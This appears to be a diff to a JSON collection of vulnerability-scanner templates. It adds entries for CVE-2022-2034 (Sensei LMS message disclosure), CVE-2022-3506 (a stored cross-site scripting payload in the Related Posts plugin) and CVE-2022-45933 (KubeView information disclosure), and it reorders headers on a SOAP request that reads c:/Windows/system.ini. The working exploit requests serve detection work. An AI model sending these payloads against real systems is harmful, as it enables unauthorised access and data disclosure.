@@ -12412,9 +12412,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -20548,6 +20548,21 @@
       ]
     },
     {
+      "id": "CVE-2022-2034",
+      "info": {
+        "name": "Sensei LMS < 4.5.0 - Unauthenticated Private Messages Disclosure",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-json/wp/v2/sensei-messages/{{num}}"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-21371",
       "info": {
         "name": "Oracle WebLogic Server Local File Inclusion",
@@ -22634,6 +22649,23 @@
       ]
     },
     {
+      "id": "CVE-2022-3506",
+      "info": {
+        "name": "WordPress Related Posts <= 2.1.2 - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In\n",
+            "GET /wp-admin/options-general.php?page=rp4wp HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /wp-admin/options.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\noption_page=rp4wp&action=update&_wpnonce={{nonce}}&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Drp4wp&rp4wp%5Bautomatic_linking%5D=1&rp4wp%5Bautomatic_linking_post_amount%5D=3&rp4wp%5Bheading_text%5D=%22+autofocus+onfocus%3Dalert%28document.domain%29%3E&rp4wp%5Bexcerpt_length%5D=15&rp4wp%5Bcss%5D=.rp4wp-related-posts+ul%7Bwidth%3A100%25%3Bpadding%3A0%3Bmargin%3A0%3Bfloat%3Aleft%3B%7D%0D%0A.rp4wp-related-posts+ul%3Eli%7Blist-style%3Anone%3Bpadding%3A0%3Bmargin%3A0%3Bpadding-bottom%3A20px%3Bclear%3Aboth%3B%7D%0D%0A.rp4wp-related-posts+ul%3Eli%3Ep%7Bmargin%3A0%3Bpadding%3A0%3B%7D%0D%0A.rp4wp-related-post-image%7Bwidth%3A35%25%3Bpadding-right%3A25px%3B-moz-box-sizing%3Aborder-box%3B-webkit-box-sizing%3Aborder-box%3Bbox-sizing%3Aborder-box%3Bfloat%3Aleft%3B%7D\n",
+            "GET /wp-admin/options-general.php?page=rp4wp&settings-updated=true HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-35151",
       "info": {
         "name": "kkFileView 4.1.0 - Cross-Site Scripting",
@@ -23214,6 +23246,21 @@
           "raw": [
             "POST /index.php?m=login&a=attemptLogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername={{username}}&password={{password}}\n",
             "GET /index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=</script><script>alert(document.domain)</script> HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-45933",
+      "info": {
+        "name": "KubeView - Information disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/api/scrape/kube-system"
           ]
         }
       ]
